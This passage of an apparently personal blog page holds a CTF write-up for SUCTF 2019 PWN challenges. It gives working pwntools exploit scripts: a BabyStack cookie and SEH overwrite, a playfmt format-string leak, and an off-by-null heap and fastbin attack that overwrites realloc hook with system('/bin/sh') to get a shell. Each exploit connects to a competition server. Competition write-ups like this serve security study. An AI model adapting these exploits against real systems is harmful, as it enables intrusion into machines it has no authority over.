class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=remote(<span class="string">"121.40.159.66"</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="comment">#p.sendlineafter("1234&gt;","BabyStack.exe")</span></span><br><span class="line">p.recvuntil(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_addr=int(p.recvuntil(<span class="string">"\n"</span>).strip(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">"= "</span>)</span><br><span class="line">main_addr=int(p.recvuntil(<span class="string">"\n"</span>).strip(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack_addr),hex(main_addr)</span><br><span class="line">code1=hex(main_addr+<span class="number">0x1018551</span><span class="number">-0x101395E</span>)[<span class="number">2</span>:].upper().rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,code1)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,str(main_addr+<span class="number">0x108C004</span><span class="number">-0x101395E</span>))</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">cookie=int(p.recvuntil(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,str(stack_addr+<span class="number">0x98FE70</span><span class="number">-0x98FEA8</span>))</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">magic1=int(p.recvuntil(<span class="string">"\r\n"</span>),<span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,str(stack_addr+<span class="number">0x98FE70</span><span class="number">-0x98FEA8</span>+<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">magic2=int(p.recvuntil(<span class="string">"\r\n"</span>),<span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,str(stack_addr+<span class="number">0x98FE70</span><span class="number">-0x98FEA8</span>+<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">magic3=int(p.recvuntil(<span class="string">"\r\n"</span>),<span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,str(stack_addr+<span class="number">0x12FFCC8</span><span class="number">-0x12FFD04</span>))</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">magic4=int(p.recvuntil(<span class="string">"\r\n"</span>),<span class="number">16</span>)</span><br><span class="line">addr=stack_addr+<span class="number">0x98FDE0</span><span class="number">-0x98FEA8</span></span><br><span class="line">payload=<span class="string">"aaaa"</span>+p32(<span class="number">0xffffffe4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xffffff0c</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xfffffffe</span>)+p32(main_addr+<span class="number">0x1018266</span><span class="number">-0x101395E</span>)*<span class="number">2</span>+p32(magic4)*<span class="number">29</span>+p32(magic1)+p32(magic2)+p32(magic3)+p32(main_addr+<span class="number">0x1019A30</span><span class="number">-0x101395E</span>)+p32(cookie^addr)+p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#time.sleep(20)</span></span><br><span class="line">p.sendlineafter(<span class="string">"\r\n"</span>,<span class="string">"kirin"</span>)</span><br><span class="line"><span class="comment">#time.sleep(20)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"more?\r\n"</span>,<span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?\r\n"</span>,<span class="string">"kirin"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-playfmt"><a href="#0x03-playfmt" class="headerlink" title="0x03 playfmt"></a>0x03 playfmt</h2><p>格式化字符串漏洞且读取的flag在堆上<br>格式化字符串在全局变量<br>直接修改一个栈内指向另一个栈内指针的指针即可将一个指针指向堆指针处<br>而后再修改低字节指向&amp;flag，%s即得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./playfmt")</span></span><br><span class="line">p=remote(<span class="string">"120.78.192.35"</span>,<span class="number">9999</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"=\n"</span>,<span class="string">"%6$lx"</span>)</span><br><span class="line">s=<span class="string">"0x"</span>+p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">stack_addr=int(s.strip(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">stack2=stack_addr+<span class="number">0xFFFFCF28</span><span class="number">-0xffffcef8</span><span class="number">-0x20</span></span><br><span class="line">p.sendline(<span class="string">"%"</span>+str(stack2&amp;<span class="number">0xff</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendline(<span class="string">"%16c%14$hhn"</span>)</span><br><span class="line">p.sendline(<span class="string">"%18$s"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x04-二手破电脑"><a href="#0x04-二手破电脑" class="headerlink" title="0x04 二手破电脑"></a>0x04 二手破电脑</h2><p>程序在添加note时scanf存在off by null<br>利用off by null构造unlink，造成堆重叠，然后即可leak堆和libc地址<br>因为32位各种hook的周围合法地址只有”0xff”（32位程序高地址0xFF）<br>所以选择unsored bin attack覆盖global_max_fast即可成功将fastbin分配到realloc hook周围<br>而后fastbin attack修改realloc hook为system，在edit过程即可执行system(“/bin/sh”)来get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,note,prize)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"1"</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(l))</span><br><span class="line">  p.sendafter(<span class="string">": "</span>,note)</span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(prize))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(index,note,score)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"2"</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line">  p.sendafter(<span class="string">": "</span>,note)</span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(score))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"3"</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line">  p.recvuntil(<span class="string">"Comment "</span>)</span><br><span class="line">  s=p.recvuntil(<span class="string">"1."</span>)</span><br><span class="line">  <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note,power=<span class="number">0</span>,serial=<span class="string">""</span>)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"4"</span>) </span><br><span class="line">  p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line">  p.send(note)</span><br><span class="line">  <span class="keyword">if</span> power:</span><br><span class="line">     p.sendlineafter(<span class="string">")"</span>,<span class="string">"y"</span>)</span><br><span class="line">     p.sendafter(<span class="string">"serial: "</span>,serial)</span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">     p.sendlineafter(<span class="string">")"</span>,<span class="string">"n"</span>)</span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">p=remote(<span class="string">"47.111.59.243"</span>,<span class="number">10001</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">"bbbb"</span>,<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"cccc\n"</span>,<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="string">"b"</span>,<span class="number">12</span>)</span><br><span class="line">libc_addr=u32(delete(<span class="number">1</span>)[<span class="number">0</span>:<span class="number">4</span>])+<span class="number">0xf7dfa000</span><span class="number">-0xf7fac762</span>+<span class="number">0x2000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"aaaaaa\n"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">"ddddddd\n"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"eeee\n"</span>,<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a"</span>*<span class="number">0x14</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">  add(<span class="number">0x14</span>,<span class="string">"a"</span>*(<span class="number">0x14</span>-i<span class="number">-1</span>)+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">  delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a"</span>*<span class="number">16</span>+<span class="string">"\xa8"</span>+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x24</span>,<span class="string">"aaaaaa\n"</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">2</span>,<span class="string">"2"</span>*<span class="number">84</span>,<span class="number">0</span>)</span><br><span class="line">s=delete(<span class="number">2</span>)</span><br><span class="line">heap_addr=u32(s[<span class="number">84</span>:<span class="number">84</span>+<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="string">"1"</span>*<span class="number">72</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>)+p32(heap_addr++<span class="number">0x2c8</span>)+p32(heap_addr)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>),<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">2</span>,p32(<span class="number">0</span>)*<span class="number">24</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>)+<span class="string">"a"</span>*<span class="number">16</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x19</span>),<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">comment(<span class="number">3</span>,p32(<span class="number">0</span>)*<span class="number">9</span>+p32(<span class="number">0x91</span>)+p32(libc_addr<span class="number">-0xf7e1f000</span>+<span class="number">0xf7fcf7b0</span>)+p32(libc_addr+<span class="number">0x1b18e0</span><span class="number">-0x8</span>),<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">4</span>,<span class="string">"4444"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">"a\n"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x14</span>,p32(heap_addr+<span class="number">0x2e0</span>)+p32(heap_addr+<span class="number">0x1d8</span>)+<span class="string">"\n"</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0xec</span>,p32(libc_addr+<span class="number">0xf7fcf743</span>+<span class="number">8</span><span class="number">-0xf7e1f000</span>)+<span class="string">"\n"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,p32(libc_addr+<span class="number">0xf7fcf743</span>+<span class="number">8</span><span class="number">-0xf7e1f000</span>)+<span class="string">"\n"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">"/bin/sh\n"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">"a"</span>*<span class="number">17</span>+p32(libc_addr+<span class="number">0x3a940</span>)+<span class="string">"\n"</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-sudrv"><span class="toc-number">1.</span> <span class="toc-text">0x01 sudrv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BabyStack"><span class="toc-number">2.</span> <span class="toc-text">0x02 BabyStack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-playfmt"><span class="toc-number">3.</span> <span class="toc-text">0x03 playfmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-二手破电脑"><span class="toc-number">4.</span> <span class="toc-text">0x04 二手破电脑</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&text=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&is_video=false&description=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SUCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/08/19/SUCTF-2019-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&name=SUCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


